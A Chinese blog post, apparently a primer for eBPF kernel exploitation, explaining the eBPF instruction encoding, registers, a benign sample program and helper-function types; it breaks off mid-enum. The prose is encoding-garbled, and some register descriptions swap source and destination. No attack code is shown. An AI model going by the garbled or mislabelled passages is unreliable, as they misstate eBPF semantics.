<p>è¿™æ˜¯bpfæŒ‡ä»¤ç»“æ„ä½“ï¼Œçœ‹ç€å¥½åƒå¹¶ä¸å¤æ‚ï¼Œä½†éº»é›€è™½å°äº”è„ä¿±å…¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line"> __u8 code;  <span class="comment">/* opcode */</span></span><br><span class="line"> __u8 dst_reg:<span class="number">4</span>; <span class="comment">/* dest register */</span></span><br><span class="line"> __u8 src_reg:<span class="number">4</span>; <span class="comment">/* source register */</span></span><br><span class="line"> __s16 off;  <span class="comment">/* signed offset */</span></span><br><span class="line"> __s32 imm;  <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¸€æ¡eBPFæŒ‡ä»¤åˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯<strong>æ“ä½œç </strong>ï¼Œ<strong>ç›®çš„å¯„å­˜å™¨</strong>ï¼Œ<strong>æºå¯„å­˜å™¨</strong>ï¼Œï¼ˆæœ‰ç¬¦å·ï¼‰<strong>åç§»</strong>å’Œï¼ˆæœ‰ç¬¦å·ï¼‰<strong>ç«‹å³æ•°</strong>ï¼Œé•¿åº¦ä¸º64bitï¼ˆ8å­—èŠ‚ï¼‰</p>
<p>ç¼–ç æ ¼å¼ï¼š</p>
<table>
    <tr>
        <td>æ“ä½œç ï¼ˆopcodeï¼‰ 8bit</td>
        <td>å¯„å­˜å™¨ï¼ˆregsï¼‰ (4 + 4 =)8bit</td>
        <td>åç§»ï¼ˆoffsetï¼‰16bit</td>
    </tr>
    <tr>
        <td colspan="3">ç«‹å³æ•°ï¼ˆimmï¼‰ 32bit</td>
    </tr>
</table>

<blockquote>
<p>å­˜åœ¨å®½ç¼–ç æ ¼å¼æŒ‡ä»¤ï¼Œåæ¥32bitæ— ç”¨ä¿ç•™åŒºåŠç¬¬äºŒä¸ª32bitçš„ç«‹å³æ•°ï¼Œæ­¤æ—¶æŒ‡ä»¤é•¿åº¦ä¸º128bitï¼ˆ16å­—èŠ‚ï¼‰ï¼ˆå…¶å®æ˜¯ä¸¤æ¡æŒ‡ä»¤æ‹¼ä¸€å—ï¼‰<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf_common.h">æ“ä½œç å®å®šä¹‰</a></p>
<blockquote>
<p>è¯¦ç»†ç¼–ç æ ¼å¼ä¸å†èµ˜è¿°ï¼Œ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/standardization/instruction-set.rst">è¯¦è§æ­¤å¤„</a></p>
</blockquote>
</blockquote>
<p>æ“ä½œç ï¼ˆcodeï¼‰åˆ†ä¸º8ç±»ï¼Œåˆ†åˆ«ä¸ºï¼š</p>
<ul>
<li><code>BPF_LD</code> ä»64ä½ç«‹å³æ•°ï¼ˆimm64, ä»…å…è®¸å®½æŒ‡ä»¤ï¼‰åœ°å€å–å€¼å­˜å…¥ç›®çš„å¯„å­˜å™¨ï¼ˆsrc_regï¼‰</li>
<li><code>BPF_LDX</code> ä»æºå¯„å­˜å™¨ï¼ˆdst_regï¼‰åœ°å€å–å€¼å­˜å…¥ç›®çš„å¯„å­˜å™¨ï¼ˆsrc_regï¼‰</li>
<li><code>BPF_ST</code> æŠŠç«‹å³æ•°ï¼ˆimmï¼‰å­˜å…¥ç›®çš„å¯„å­˜å™¨ï¼ˆdst_regï¼‰å¯¹åº”åœ°å€</li>
<li><code>BPF_STX</code> æŠŠæºå¯„å­˜å™¨ï¼ˆsrc_regï¼‰æ•°æ®å­˜å…¥ç›®çš„å¯„å­˜å™¨ï¼ˆdst_regï¼‰å¯¹åº”åœ°å€</li>
<li><code>BPF_ALU</code> 32ä½ç®—æœ¯æ“ä½œ</li>
<li><code>BPF_JMP</code> 64ä½è·³è½¬æ“ä½œ</li>
<li><code>BPF_JMP32</code> 32ä½è·³è½¬æ“ä½œ</li>
<li><code>BPF_ALU64</code> 64ä½ç®—æœ¯æ“ä½œ</li>
</ul>
<p><code>BPF_LD(X)</code>&#x2F;<code>BPF_ST(X)</code>æ“ä½œæ¶‰åŠå–å€ï¼Œéœ€åŒæ—¶æä¾›å–å€å¤§å°ï¼ˆsizeï¼‰ï¼Œåˆ†åˆ«æœ‰ï¼š</p>
<ul>
<li><code>BPF_W</code> word (32ä½)</li>
<li><code>BPF_H</code> half word (16ä½)</li>
<li><code>BPF_B</code> byte (8ä½)</li>
<li><code>BPF_DW</code> double word (64ä½)</li>
</ul>
<blockquote>
<p>è¿™é‡Œçš„wordï¼ˆå­—ï¼‰çš„å¤§å°å¹¶ä¸æ˜¯16ä½è€Œæ˜¯32ä½</p>
</blockquote>
<p>è¯¥æ“ä½œè¿˜æœ‰ä¸åŒçš„æ¨¡å¼ï¼Œ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/standardization/instruction-set.rst#L570">å‚é˜…æ­¤å¤„</a></p>
<p>å…¶ä¸­<code>BPF_ALU</code>&#x2F;<code>BPF_ALU64</code>ä¸­æœ‰14ç§ä¸åŒçš„æ“ä½œï¼Œå¸¸ç”¨çš„æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th>åå­—</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>ADD</td>
<td>dst +&#x3D; src</td>
</tr>
<tr>
<td>SUB</td>
<td>dst -&#x3D; src</td>
</tr>
<tr>
<td>MUL</td>
<td>dst *&#x3D; src</td>
</tr>
<tr>
<td>DIV</td>
<td>dst &#x3D; (src !&#x3D; 0) ? (dst &#x2F; src) : 0</td>
</tr>
<tr>
<td>MOD</td>
<td>dst &#x3D; (src !&#x3D; 0) ? (dst % src) : dst</td>
</tr>
<tr>
<td>AND</td>
<td>dst &amp;&#x3D; src</td>
</tr>
<tr>
<td>OR</td>
<td>dst |&#x3D; src</td>
</tr>
<tr>
<td>XOR</td>
<td>dst ^&#x3D; src</td>
</tr>
<tr>
<td>NEG</td>
<td>dst &#x3D; -dst</td>
</tr>
<tr>
<td>MOV</td>
<td>dst &#x3D; src</td>
</tr>
<tr>
<td>MOVSX</td>
<td>dst &#x3D; (s8,s16,s32)src ï¼ˆæ ¹æ®offsetç¡®å®šï¼‰</td>
</tr>
</tbody></table>
<blockquote>
<p>å¸¦ç¬¦å·é™¤æ³•&#x2F;å–æ¨¡æ“ä½œåœ¨å¯¹åº”å‘½ä»¤å‰åŠ ä¸Š<code>S</code>å³å¯ï¼ˆ<code>SDIV</code>&#x2F;<code>SMOD</code>ï¼‰<br>å®Œæ•´ç‰ˆ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/standardization/instruction-set.rst#L325">å‚é˜…æ­¤å¤„</a></p>
</blockquote>
<p><code>BPF_JMP32</code>&#x2F;<code>BPF_JMP</code>ä¹Ÿæœ‰14ç§ä¸åŒçš„ç±»å‹ï¼Œå¸¸ç”¨çš„æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th>åå­—</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>JA</td>
<td>PC +&#x3D; offset&#x2F;imm ï¼ˆç«‹å³è·³è½¬ï¼‰</td>
</tr>
<tr>
<td>JEQ</td>
<td>PC +&#x3D; offset if dst &#x3D;&#x3D; src ï¼ˆç›¸ç­‰è·³è½¬ï¼‰</td>
</tr>
<tr>
<td>JNE</td>
<td>PC +&#x3D; offset if dst !&#x3D; src ï¼ˆä¸ç­‰è·³è½¬ï¼‰</td>
</tr>
<tr>
<td>JGT</td>
<td>PC +&#x3D; offset if dst &gt; src ï¼ˆæ— ç¬¦å·ï¼‰</td>
</tr>
<tr>
<td>JGE</td>
<td>PC +&#x3D; offset if dst &gt;&#x3D; src ï¼ˆæ— ç¬¦å·ï¼‰</td>
</tr>
<tr>
<td>JLT</td>
<td>PC +&#x3D; offset if dst &lt; src ï¼ˆæ— ç¬¦å·ï¼‰</td>
</tr>
<tr>
<td>JLE</td>
<td>PC +&#x3D; offset if dst &lt;&#x3D; src ï¼ˆæ— ç¬¦å·ï¼‰</td>
</tr>
<tr>
<td>JSET</td>
<td>PC +&#x3D; offset if dst &amp; src</td>
</tr>
</tbody></table>
<blockquote>
<p>å¸¦ç¬¦å·æ¯”è¾ƒæ“ä½œåœ¨å¯¹åº”å‘½ä»¤ä¸­é—´åŠ ä¸Š<code>S</code>å³å¯ï¼ˆ<code>JSGT</code>ï¼Œ<code>JSLE</code>ç­‰ï¼‰</p>
</blockquote>
<p>æ¯”è¾ƒç‰¹æ®Šçš„æŒ‡ä»¤æœ‰ï¼š</p>
<table>
<thead>
<tr>
<th>åå­—</th>
<th>æºå¯„å­˜å™¨(src_reg)</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>CALL</td>
<td>src_reg &#x3D; 0x0</td>
<td>é€šè¿‡immå¯¹åº”çš„static idè°ƒç”¨Helperå‡½æ•°</td>
</tr>
<tr>
<td>CALL</td>
<td>src_reg &#x3D; 0x1</td>
<td>PC +&#x3D; imm ï¼ˆä½œä¸ºå‡½æ•°è°ƒç”¨ï¼‰</td>
</tr>
<tr>
<td>CALL</td>
<td>src_reg &#x3D; 0x2</td>
<td>é€šè¿‡immå¯¹åº”çš„BTF idè°ƒç”¨Helperå‡½æ•°</td>
</tr>
<tr>
<td>EXIT</td>
<td>src_reg &#x3D; 0x0</td>
<td>ä»å‡½æ•°&#x2F;eBPFç¨‹åºè¿”å›</td>
</tr>
</tbody></table>
<p>å¯¹äºç›®çš„å¯„å­˜å™¨å’Œæºå¯„å­˜å™¨ï¼Œæœ‰<code>BPF_REG_0</code>åˆ°<code>BPF_REG_10</code>ä¸€å…±11ç§ï¼Œå‡ä¸º64ä½å¯„å­˜å™¨ï¼Œè¿™äº›å¯„å­˜å™¨çš„åŠŸèƒ½&#x2F;å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼ˆä¸‹ç”¨<code>Rx</code>ä»£æ›¿<code>BPF_REG_x</code>ï¼‰ï¼š</p>
<blockquote>
<p>å‚é˜…<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/classic_vs_extended.rst">æ­¤å¤„</a></p>
</blockquote>
<ul>
<li>R0 (rax): å‡½æ•°è°ƒç”¨è¿”å›å€¼&#x2F;BPFç¨‹åºè¿”å›å€¼</li>
<li>R1 (rdi): åœ¨eBPFç¨‹åºè¿è¡Œå‰è‡ªåŠ¨èµ‹å€¼ä¸ºctxï¼ˆä¸åŒçš„cmdå‚æ•°å¯¹åº”ç€ä¸åŒçš„ç±»å‹ï¼Œsocket filterä¸­ä¸ºsocketç¼“å†²åŒºï¼‰ï¼Œåœ¨è°ƒç”¨å‡½æ•°æ—¶å……å½“argv1</li>
<li>R2 (rsi): argv2</li>
<li>R3 (rdx): argv3</li>
<li>R4 (rcx): argv4</li>
<li>R5 (r8): argv5</li>
<li>R6 (rbx): è¢«è°ƒç”¨æ–¹ä¿ç•™</li>
<li>R7 (r13): è¢«è°ƒç”¨æ–¹ä¿ç•™</li>
<li>R8 (r14): è¢«è°ƒç”¨æ–¹ä¿ç•™</li>
<li>R9 (r15): è¢«è°ƒç”¨æ–¹ä¿ç•™</li>
<li>R10 (rbp): åªè¯»å¯„å­˜å™¨ï¼ŒæŒ‡å‘æ ˆå¸§ï¼Œç”¨äºè®¿é—®æ ˆ</li>
</ul>
<blockquote>
<p>eBPFä»…å…è®¸å‚æ•°å°äºç­‰äº5ä¸ªçš„å‡½æ•°ï¼Œåœ¨è®¾è®¡æ—¶ä¹Ÿè¦è€ƒè™‘è¿™ä¸€ç‚¹</p>
</blockquote>
<h2 id="eBPFæŒ‡ä»¤ç¼–å†™"><a href="#eBPFæŒ‡ä»¤ç¼–å†™" class="headerlink" title="eBPFæŒ‡ä»¤ç¼–å†™"></a>eBPFæŒ‡ä»¤ç¼–å†™</h2><p>ä»¥ä¸Šä¾¿æ˜¯eBPFæŒ‡ä»¤ï¼ˆ<code>struct bpf_insn</code>ï¼‰çš„ç»†èŠ‚ï¼Œäº†è§£äº†è¿™äº›æˆ‘ä»¬ä¾¿å¯ä»¥ç¼–å†™eBPFç¨‹åºäº†ã€‚<br>ä¸€ä¸ªeBPFç¨‹åºäº‹å®ä¸Šå°±æ˜¯ä¸€ä¸ªeBPFç»“æ„ä½“æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŒ‰ç…§æ•°ç»„&#x2F;ç»“æ„ä½“çš„å£°æ˜æ–¹å¼ç›´æ¥ä¸€å¥ä¸€å¥åœ°ç¼–å†™eBPFç¨‹åºï¼Œä½†è¿™æ ·æ— å¼‚äºæ‰‹æ“æœºå™¨ç ï¼Œè¿‡äºç¹çã€‚<br>ä¸ºäº†ç¨å¾®ç®€åŒ–eBPFç¨‹åºçš„ç¼–å†™ï¼ŒLinuxé¡¹ç›®æœ¬èº«æä¾›äº†ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/samples/bpf/bpf_insn.h#L10">å®å®šä¹‰å¤´æ–‡ä»¶<strong>bpf_insn.h</strong></a>ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒå¤åˆ¶ä¸‹æ¥ä½œä¸ºå¤´æ–‡ä»¶ä½¿ç”¨ã€‚</p>
<blockquote>
<p>äº‹å®ä¸Šè¿™ç§æ–¹æ³•åªæ˜¯å°†æ‰‹æ“æœºå™¨ç å‡çº§åˆ°äº†æ‰‹æ“æ±‡ç¼–ï¼Œåœ¨ç¼–å†™å¤æ‚åŠŸèƒ½eBPFæ—¶è¿˜æ˜¯è¦ç”¨åˆ°ç¬¬ä¸‰æ–¹åº“ï¼ˆlibbpf&#x2F;libxdpç­‰ï¼‰</p>
</blockquote>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ç¨‹åºï¼š</p>
<blockquote>
<p>éœ€è¦çš„å¤´æ–‡ä»¶ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./bpf_insn.h&quot;</span> <span class="comment">// your path to bpf_insn.h</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">bpf_prog</span>[] =</span> &#123;</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_1, <span class="number">0x1</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0x2</span>),</span><br><span class="line"></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x10</span>, <span class="number">0x3</span>),</span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x8</span>, <span class="number">0x4</span>),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, <span class="number">-0x8</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_10, <span class="number">-0x10</span>),</span><br><span class="line"></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_4),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0x0</span>),</span><br><span class="line">    BPF_EXIT_INSN()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯¹åº”ç”Ÿæˆçš„æ±‡ç¼–å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffc0000668:  endbr64</span><br><span class="line">0xffffffffc000066c:  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">0xffffffffc0000671:  xchg   ax,ax</span><br><span class="line">0xffffffffc0000673:  push   rbp</span><br><span class="line">0xffffffffc0000674:  mov    rbp,rsp</span><br><span class="line">0xffffffffc0000677:  endbr64</span><br><span class="line">0xffffffffc000067b:  sub    rsp,0x10</span><br><span class="line">0xffffffffc0000682:  push   r14</span><br><span class="line">0xffffffffc0000684:  mov    r14,rdi</span><br><span class="line">0xffffffffc0000687:  mov    edi,0x1</span><br><span class="line">0xffffffffc000068c:  mov    esi,0x2</span><br><span class="line">0xffffffffc0000691:  mov    QWORD PTR [rbp-0x10],0x3</span><br><span class="line">0xffffffffc0000699:  lfence</span><br><span class="line">0xffffffffc000069c:  mov    QWORD PTR [rbp-0x8],0x4</span><br><span class="line">0xffffffffc00006a4:  lfence</span><br><span class="line">0xffffffffc00006a7:  mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">0xffffffffc00006ab:  mov    rcx,QWORD PTR [rbp-0x10]</span><br><span class="line">0xffffffffc00006af:  add    rdx,rcx</span><br><span class="line">0xffffffffc00006b2:  xor    eax,eax</span><br><span class="line">0xffffffffc00006b4:  pop    r14</span><br><span class="line">0xffffffffc00006b6:  leave</span><br><span class="line">0xffffffffc00006b7:  ret</span><br></pre></td></tr></table></figure>
</blockquote>
<p>å¯ä»¥çœ‹å‡ºè¯¥ç¨‹åºä»…ä»…æ˜¯è¿›è¡Œäº†ä¸€äº›<del>æ„ä¹‰ä¸æ˜çš„</del>å¯„å­˜å™¨å’Œæ ˆæ“ä½œï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…ç”¨å¤„ã€‚ä¸ºäº†æ‹“å±•ç¨‹åºåŠŸèƒ½ï¼ŒåŒæ—¶å‡å°‘å†…æ ¸ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€ï¼ŒebPFæä¾›äº†ä¸€ç³»åˆ—Helperå‡½æ•°ï¼Œæ¥å®ç°æ›´å¼ºå¤§æ–¹ä¾¿çš„åŠŸèƒ½ã€‚</p>
<h2 id="Helperå‡½æ•°"><a href="#Helperå‡½æ•°" class="headerlink" title="Helperå‡½æ•°"></a>Helperå‡½æ•°</h2><p>eBPFä¸­çš„Helperå‡½æ•°æ˜¯å†…æ ¸å‡½æ•°ï¼Œè¿è¡Œåœ¨å†…æ ¸ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥å…è®¸eBPFç¨‹åºå¦‚åŒè°ƒç”¨å‡½æ•°ä¸€æ ·ä¸å†…æ ¸äº¤äº’<br>Helperå‡½æ•°åŠŸèƒ½å¼ºå¤§ï¼Œç”¨é€”å¾ˆå¹¿ã€‚ç›®å‰ä¸€å…±æœ‰211ä¸ªHelperå‡½æ•°ï¼Œå¯ä»¥è¢«åˆ†ä¸ºmapç›¸å…³ï¼Œtraceç¨‹åºç›¸å…³ï¼Œprintç›¸å…³ï¼Œç½‘ç»œç›¸å…³ç­‰ç±»åˆ«<br>åœ¨eBPF pwnä¸­ï¼Œä¸€èˆ¬åªéœ€è¦å…³æ³¨éƒ¨åˆ†å¸¸ç”¨&#x2F;æ–¹ä¾¿æ¼æ´åˆ©ç”¨çš„Helperå‡½æ•°å³å¯</p>
<blockquote>
<p>è°ƒç”¨å‡½æ•°çš„æ–¹æ³•å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_NAME)</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="ä¼ å‚è§„åˆ™"><a href="#ä¼ å‚è§„åˆ™" class="headerlink" title="ä¼ å‚è§„åˆ™"></a>ä¼ å‚è§„åˆ™</h3><p>åœ¨è°ƒç”¨Helperå‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹Helperå‡½æ•°çš„ä¼ å‚ç±»å‹è§„åˆ™ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹Helperå‡½æ•°åŸå‹ï¼š</p>
<figure class="highlight c"><figcaption><span>å‡½æ•°åŸå‹</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/bpf/helpers.c#L109">å‡ºå¤„</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_pop_elem_proto</span> =</span> &#123;</span><br><span class="line"> .func  = bpf_map_pop_elem,</span><br><span class="line"> .gpl_only = <span class="literal">false</span>,</span><br><span class="line"> .ret_type = RET_INTEGER,</span><br><span class="line"> .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="line"> .arg2_type = ARG_PTR_TO_MAP_VALUE | MEM_UNINIT | MEM_WRITE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸‰ä¸ªç±»å‹ï¼š<code>ret_type</code>ï¼ˆç±»å‹ä¸º<code>bpf_return_type</code>ï¼‰, <code>arg_type</code>ï¼ˆç±»å‹ä¸º<code>bpf_arg_type</code>ï¼‰åŠå…¶åè¾¹æˆ–æ“ä½œçš„å‚æ•°æ ‡å¿—(ç±»å‹ä¸º<code>bpf_type_flag</code>)</p>
<ul>
<li>å‚æ•°ç±»å‹<code>bpf_arg_type</code></li>
</ul>
<figure class="highlight c"><figcaption><span>éƒ¨åˆ†</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/bpf.h#L750">å®Œæ•´ç‰ˆ</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* å‡½æ•°å‚æ•°çº¦æŸ */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_arg_type</span> &#123;</span></span><br><span class="line">  ARG_DONTCARE = <span class="number">0</span>, <span class="comment">/* åœ¨helperå‡½æ•°ä¸­æ²¡æœ‰ç”¨çš„å‚æ•°*/</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ä»¥ä¸‹çš„çº¦æŸåœ¨å‡½æ•°</span></span><br><span class="line"><span class="comment">  * bpf_map_lookup/update/delete_elem() ä¸­ä½¿ç”¨</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  ARG_CONST_MAP_PTR, <span class="comment">/* å¸¸é‡(const)å‚æ•° ç”¨ä½œæŒ‡å‘bpf_mapçš„æŒ‡é’ˆ */</span></span><br><span class="line">  ARG_PTR_TO_MAP_KEY, <span class="comment">/* æŒ‡å‘æ ˆçš„æŒ‡é’ˆï¼Œç”¨ä½œmapçš„é”®(key) */</span></span><br><span class="line">  ARG_PTR_TO_MAP_VALUE, <span class="comment">/* æŒ‡å‘æ ˆçš„æŒ‡é’ˆï¼Œç”¨ä½œmapçš„å€¼(value) */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* åœ¨å‡½æ•°åŸå‹bpf_memcmp()å’Œå…¶ä»–è®¿é—®eBPFç¨‹åºæ ˆä¸Šæ•°æ®çš„å‡½æ•°ä½¿ç”¨ */</span></span><br><span class="line">  ARG_PTR_TO_MEM,  <span class="comment">/* æŒ‡å‘æœ‰æ•ˆåœ°å€çš„æŒ‡é’ˆ(stack, packet, map value) */</span></span><br><span class="line">  ARG_PTR_TO_ARENA,</span><br><span class="line"></span><br><span class="line">  ARG_CONST_SIZE,  <span class="comment">/* è®¿é—®å†…å­˜çš„å­—èŠ‚æ•°é‡ */</span></span><br><span class="line">  ARG_CONST_SIZE_OR_ZERO, <span class="comment">/* è®¿é—®å†…å­˜çš„å­—èŠ‚æ•°é‡(å¯ä»¥æ˜¯0) */</span></span><br><span class="line"></span><br><span class="line">  ARG_PTR_TO_CTX,  <span class="comment">/* æŒ‡å‘context */</span></span><br><span class="line">  ARG_ANYTHING,  <span class="comment">/* ä»»æ„ (åˆå§‹åŒ–çš„) å‚æ•° */</span></span><br><span class="line">  ...</span><br><span class="line">  ARG_PTR_TO_FUNC, <span class="comment">/* æŒ‡å‘bpfå‡½æ•°çš„æŒ‡é’ˆ */</span></span><br><span class="line">  ARG_PTR_TO_STACK, <span class="comment">/* æŒ‡å‘eBPFæ ˆ(stack) */</span></span><br><span class="line">  ARG_PTR_TO_CONST_STR, <span class="comment">/* æŒ‡å‘ä¸€ä¸ªç©ºå­—ç¬¦(\x00)æˆªæ­¢çš„åªè¯»å­—ç¬¦ä¸² */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ARG_CONST_MAP_PTR</code>: è¯¥ç±»å‹å¯ä»¥ç”±å®<code>BPF_LD_MAP_FD</code>ï¼ˆå‡ºè‡ªbpf_insn.hï¼Œè§ä¸Šæ–‡ï¼‰ä¼ å…¥mapçš„æ–‡ä»¶æè¿°ç¬¦å¾—åˆ°</p>
<p><code>ARG_PTR_TO_CTX</code>: è¯¥ç±»å‹ä¸º<code>BPF_REG_1</code>åœ¨è¿è¡Œå‰è¢«èµ‹å€¼çš„ç±»å‹</p>
<ul>
<li>è¿”å›å€¼ç±»å‹<code>bpf_return_type</code></li>
</ul>
<figure class="highlight c"><figcaption><span>éƒ¨åˆ†</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/bpf.h#L809">å®Œæ•´ç‰ˆ</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helperå‡½æ•°è¿”å›å€¼çš„ç±»å‹ */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_return_type</span> &#123;</span></span><br><span class="line">  RET_INTEGER,   <span class="comment">/*  å‡½æ•°è¿”å›æ•´æ•°(int)*/</span></span><br><span class="line">  RET_VOID,   <span class="comment">/* å‡½æ•°ä»€ä¹ˆä¹Ÿä¸è¿”å› */</span></span><br><span class="line">  RET_PTR_TO_MAP_VALUE,  <span class="comment">/* è¿”å›ä¸€ä¸ªæŒ‡å‘mapå…ƒç´ å€¼(value)çš„æŒ‡é’ˆ*/</span></span><br><span class="line">  RET_PTR_TO_SOCKET,  <span class="comment">/* è¿”å›ä¸€ä¸ªæŒ‡å‘socketç»“æ„ä½“çš„æŒ‡é’ˆ */</span></span><br><span class="line">  RET_PTR_TO_TCP_SOCK,  <span class="comment">/* è¿”å›ä¸€ä¸ªæŒ‡å‘tcp_sockç»“æ„ä½“çš„æŒ‡é’ˆ */</span></span><br><span class="line">  RET_PTR_TO_SOCK_COMMON,  <span class="comment">/* è¿”å›ä¸€ä¸ªæŒ‡å‘sock_commonç»“æ„ä½“çš„æŒ‡é’ˆ */</span></span><br><span class="line">  RET_PTR_TO_MEM,   <span class="comment">/* è¿”å›ä¸€ä¸ªæŒ‡å‘å†…å­˜çš„æŒ‡é’ˆ */</span></span><br><span class="line">  RET_PTR_TO_MEM_OR_BTF_ID, <span class="comment">/* 